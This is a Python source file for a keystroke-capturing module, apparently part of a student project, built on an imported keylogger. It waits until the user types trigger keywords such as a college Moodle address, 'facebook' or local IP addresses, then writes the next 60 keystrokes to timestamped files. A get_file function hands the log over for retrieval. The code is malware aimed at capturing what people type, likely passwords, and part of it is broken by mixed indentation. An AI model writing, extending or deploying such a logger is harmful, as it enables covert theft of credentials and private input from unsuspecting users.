#!/usr/bin/python3
#NISH, PUT CODE HERE!

from . import keylogger;
import threading;
import time;
import os;

#GLOBALS
capture_limit = 60;
curr_key = "";
buffer_start = False;
key_words= []; #reads from file if present;
try:
    key_words_file = open("keys.txt","r"); #IMPORTANT : keys.txt -> file where key words are stored (line-by-line)
    key_words = key_words_file.readlines();
    key_words_file.close();
except FileNotFoundError:
    key_words = ["moodle.dbit.in","facebook","10.0.1.1","10.0.1.241"]; #IMPORTANT : Fill this out, please try to keep distinct starting letters (program crashes otherwise)
string_matcher_collection = [];

class StringMatcher:
    def __init__(self,string):
        self.string = string; #string to be checked
        self.match_counter = 0; #current position of matching
        self.str_len = len(string);

    def get_next(self):
        return(self.string[self.match_counter + 1]);

    def match(self,val): # return True if complete match, False otherwise
        if val == "<backspace>"  and self.match_counter > 1:
            self.match_counter-=1;
            return(False);
        if self.string[self.match_counter] == val:
            if self.match_counter < self.str_len-1:
                self.match_counter+=1;
                #print(str(self.match_counter)+"/"+str(self.str_len));
                #print("Match with "+self.string);
            elif self.match_counter == self.str_len-1:
                #print("Complete match with "+self.string+"!");
                return(True);
        elif val != "<backspace>":
            self.match_counter = 0; #reset counter on mismatch
            return(False);

class text_store:
    def __init__(self,start=""):
        self.temp=start;
        self.counter=1;
        self.storage = [];
        curr_time = str(time.time());
        f_time = curr_time[:curr_time.find(".")];
        self.fname = "op/op-"+f_time+".txt"; #IMPORTANT : Output location

    def store(self,val):
        global capture_limit;
        self.temp+=val;
        if self.counter == capture_limit:
            #print("Collected one set");
            self.storage.append(self.temp);
            self.commit_temp();
            self.temp = "";
            self.counter = 1;
            return(True);
        self.counter+=1;
        return(False);

    def commit_temp(self,text=""):
        self.store_file = open(self.fname,"a+");
        self.store_file.write(self.temp+text+"\n");
        self.store_file.close();

    def close_file(self):
        try:
            self.commit_temp("::");
        except Exception:
            pass;

    def count(self):
        return(self.counter);

    def __str__(self):
        print(self.storage);

def handle_keys(t, modifiers, keys):
    global curr_key;
    global buffer_start;
    #print (str(t)+"\t"+str(keys)+"\t"+str(modifiers));
    #print("key => "+str(keys));
    curr_key = str(keys);
    temp = "";
    if buffer_start:
        if "<" not in curr_key and curr_key != "None":
            if ts.store(curr_key) == True: #collection completed
                buffer_start = False; #Stop collecting
    else:
        for string_obj in string_matcher_collection:
            if string_obj.match(curr_key):
                #print("Complete match!");
                buffer_start = True;
        #else:
        #    print("mismatch");

class ThreadingUse(object):
	def __init__(self, interval=1):
        """ Constructor
        :type interval: int
        :param interval: Check interval, in seconds
        """
        self.interval = interval

        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True                            # Daemonize thread
        thread.start()                                  # Start the execution

    def run(self):
        """ Method that runs forever """
        while True:
            # Do something
            print('Doing something imporant in the background')

			time.sleep(self.interval)


#now = time.time();
#done = lambda: time.time() > now + 60; #should return True (stop) or False (continue)
def done():
    global curr_key;
    if curr_key == "`": #QUITTING CONDITION
        ts.commit_temp("::");
        return(True);
    else:
        return(False);

'''Ptolemy Code start'''

def start():
	try:
		keylogger.log(done, handle_keys);
	except KeyboardInterrupt:
		#print(ts);
		ts.commit_temp();
	
def stop():
	ts.commit_temp();


def get_file():
	global ts
	f = open(ts.fname, 'rb')
	send_list = f.read() #IMPORTANT Jacques: Used read() now
	f.close()
	return send_list

'''Ptolemy Code end'''

#print("Started...");
'''Setup'''
if len(key_words) == 0:
    print("ERROR : Nothing in key_words!!");
    exit();

for string in key_words:
    string_matcher_collection.append(StringMatcher(string)); #convert key word strings into StringMatcher objects

ts = text_store();

try:
    os.mkdir("op");
except FileExistsError:
    pass;


